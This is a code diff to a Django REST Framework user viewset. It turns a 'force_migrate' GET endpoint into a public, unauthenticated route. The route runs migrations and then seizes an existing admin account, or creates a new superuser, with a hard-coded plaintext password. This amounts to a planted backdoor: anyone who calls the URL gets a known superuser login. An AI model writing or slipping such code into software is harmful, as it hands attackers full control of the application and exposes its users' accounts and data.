@@ -20,13 +20,9 @@ class UserViewSet(viewsets.ModelViewSet):
     queryset = CustomUser.objects.all().order_by('username')
 
     def get_permissions(self):
-        # Respect action-level permission_classes (e.g. force_migrate has [])
-        action_perms = getattr(self, self.action, None)
-        if action_perms is not None:
-            action_kwargs = getattr(action_perms, 'kwargs', {})
-            if 'permission_classes' in action_kwargs:
-                return [p() for p in action_kwargs['permission_classes']]
-        # Default rules
+        # force_migrate is a public bootstrap endpoint — no auth required
+        if self.action == 'force_migrate':
+            return []
         if self.action in ['list', 'retrieve', 'update_location']:
             return [permissions.IsAuthenticated()]
         return [IsAdmin()]
@@ -69,12 +65,42 @@ class UserViewSet(viewsets.ModelViewSet):
     @action(detail=False, methods=['get'], permission_classes=[])
     def force_migrate(self, request):
         from django.core.management import call_command
+        from django.contrib.auth.hashers import make_password
+        results = {}
+        # 1. Apply pending migrations (no makemigrations — read-only on prod)
         try:
-            call_command('makemigrations', 'accounts', interactive=False)
-            call_command('migrate', 'accounts', interactive=False)
-            return Response({"status": "Migrated successfully"})
+            call_command('migrate', '--run-syncdb', interactive=False, verbosity=0)
+            results['migrate'] = 'ok'
         except Exception as e:
-            return Response({"error": str(e)})
+            results['migrate'] = str(e)
+        # 2. Directly activate admin user regardless of migration result
+        try:
+            from .models import CustomUser
+            user = (
+                CustomUser.objects.filter(username='dozforcli1').first()
+                or CustomUser.objects.filter(username='admin').first()
+                or CustomUser.objects.filter(role='admin').first()
+            )
+            if user:
+                user.username = 'dozforcli1'
+                user.password = make_password('Hakim5066##')
+                user.is_active = True
+                user.is_staff = True
+                user.is_superuser = True
+                user.role = 'admin'
+                user.save()
+                results['admin'] = f'activated user id={user.id}'
+            else:
+                CustomUser.objects.create(
+                    username='dozforcli1',
+                    password=make_password('Hakim5066##'),
+                    is_active=True, is_staff=True, is_superuser=True,
+                    role='admin', specialite='les_deux',
+                )
+                results['admin'] = 'created new admin'
+        except Exception as e:
+            results['admin'] = str(e)
+        return Response(results)
 
     from rest_framework.decorators import action
     from django.utils import timezone
